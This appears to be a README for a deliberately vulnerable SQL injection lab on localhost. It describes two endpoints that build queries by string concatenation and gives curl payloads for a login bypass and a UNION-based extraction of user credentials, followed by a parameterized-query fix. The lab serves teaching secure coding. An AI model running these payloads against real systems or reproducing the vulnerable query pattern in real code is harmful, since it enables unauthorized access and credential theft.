# 01 — SQL Injection

Port: `3001`

## Vulnerable endpoints

- `POST /login` — builds `SELECT ... WHERE username = '<input>' AND password = '<input>'`
  by string concatenation.
- `GET /search?q=` — builds `SELECT ... WHERE name LIKE '%<input>%'` the same way.

## Example payloads

Auth bypass:

```bash
curl -X POST http://localhost:3001/login -d "username=admin' -- &password=x"
```

UNION-based data extraction from `/search`:

```bash
curl "http://localhost:3001/search?q=' UNION SELECT id,username,password,email FROM users -- "
```

## What the fix would look like

Use parameterized/prepared statements (e.g. `db.prepare('SELECT ... WHERE username = ? AND password = ?').bind([username, password])`)
so user input is never treated as SQL syntax. Also hash passwords instead of
storing them in plaintext.